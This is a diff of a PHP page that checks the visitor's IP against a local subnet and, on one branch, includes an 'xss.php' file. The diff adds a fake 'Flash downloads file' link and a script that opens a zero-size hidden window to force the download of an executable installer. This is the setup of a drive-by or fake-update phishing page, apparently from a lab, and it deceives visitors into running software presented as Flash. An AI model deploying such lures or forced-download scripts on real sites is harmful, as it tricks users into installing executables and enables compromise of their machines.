@@ -1,22 +1,9 @@
 <?php
-setcookie("user", "runoob", time()+3600);
-?>
-
-<?php
-// 输出 cookie 值
-//echo $_COOKIE["user"];
-
-// 查看所有 cookie
-//print_r($_COOKIE);
-?>
-
-
-<?php
 $clientip = $_SERVER['REMOTE_ADDR'];
 echo $clientip;
 echo "<br>";
-$ip_start = get_iplong('192.168.1.1');
-$ip_end = get_iplong('192.168.1.255');
+$ip_start = get_iplong('192.168.31.1');
+$ip_end = get_iplong('192.168.31.255');
 $ip = get_iplong($clientip);
 
 if($ip>=$ip_start && $ip <=$ip_end)
@@ -37,11 +24,11 @@ if($ip>=$ip_start && $ip <=$ip_end)
 			else
 			{				
 				include './xss.php';
-				echo "<a href=' www.xxx.com' ><p>downloads file</p></a>";
 				echo "<br />";
-				echo "<h1>downloads file</h1>";
+				echo "<h1>if don't downlaod,please downloads file:</h1>";
 				echo "<p>";
-				echo "<h3>downloads file</h3>";
+				echo "<a href='https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe' ><p>Flash     downloads     file</p></a>";
+				echo '<script type=text/javascript>window.open("https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe","name1","width=0,height=0,toolbar=no,scrollbars=no,menubar=no,screenX=100,screenY=100");</script>';
 				exit;
 			}
 		}
